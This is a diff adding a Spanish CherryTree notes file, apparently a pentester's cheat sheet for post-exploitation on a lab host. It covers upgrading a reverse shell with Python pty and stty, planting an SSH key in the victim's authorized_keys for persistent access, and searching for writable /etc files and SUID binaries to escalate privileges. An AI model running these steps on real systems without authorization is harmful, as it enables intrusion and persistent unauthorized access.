@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="3" master_id="0" name="stabilize_shell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1790810946" ts_lastsave="1791044489">
+    <rich_text>Mirar la versión de python primero
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Para python3: python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
+ 
+Para python2 en la shell de la victima: python2 -c 'import pty; pty.spawn("/bin/bash")'
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Después ctrl + z: stty raw -echo; fg
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Para poder usar clean y comandos: 
+export TERM=xterm
+export SHELL=/bin/bash
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+
+ssh-keygen -t rsa -b 4096 -N "" -f ~/.ssh/id_rsa_pentest &amp;&amp; cat ~/.ssh/id_rsa_pentest.pub
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Este va en la Shell remota:, usamos la clave rsa que nos dio el anterior
+mkdir -p ~/.ssh &amp;&amp; echo "TU_CLAVE_PUBLICA" &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Dio denegado, entonces toca trabajar con binarios: find /etc -writable -type f 2&gt;/dev/null
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Find / -perm -4000 2&gt;/dev/null
+ 
+ssh -i ~/.ssh/id_rsa_pentest USUARIO@192.168.18.128
+
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <encoded_png char_offset="36" justification="left" link="" sha256sum="43d3e00b5177d3eed6529d3cb5f008ff5784a9b979f783aec1c562dc4eca5841"/>
+    <encoded_png char_offset="192" justification="left" link="" sha256sum="097506b2a45de073761112ac32769fcfb5f8aa776caab33989d365ca46bead2b"/>
+    <encoded_png char_offset="233" justification="left" link="" sha256sum="1847de3a99940103085828abd5f73240e87d09cb74aca1bb0a4c3b73653ccd72"/>
+    <encoded_png char_offset="313" justification="left" link="" sha256sum="ae1e39eaedd9321b3c2460fae2ab1400e14bcd1818180307648ebe4c032b81c0"/>
+    <encoded_png char_offset="408" justification="left" link="" sha256sum="9212ce925684c548e71d03473e796cadceb6f43887520dbaec847fe4b59ef4e2"/>
+    <encoded_png char_offset="610" justification="left" link="" sha256sum="84482c6a2e28b0e10a992e894e445cea67dc570e3da7797aacfc666f786f8810"/>
+    <encoded_png char_offset="705" justification="left" link="" sha256sum="b33413222a0243a62c692aa3c113c5d2f260c3e24124c9c03ecf30ea3327fedc"/>
+    <encoded_png char_offset="795" justification="left" link="" sha256sum="bfa16a07c08498d80c56312670149db0d2c70186117bdf1f3f537bfea47c7846"/>
+    <encoded_png char_offset="798" justification="left" link="" sha256sum="c61d571b4e2b47d622af7499ef3eee371df1d4e840e6021474b40bff6232de8c"/>
+    <encoded_png char_offset="801" justification="left" link="" sha256sum="693fd9a43ada27b5a251a2f707b3d86ff16ee415c80419ad8d8a50a26b298d22"/>
+  </node>
+</cherrytree>
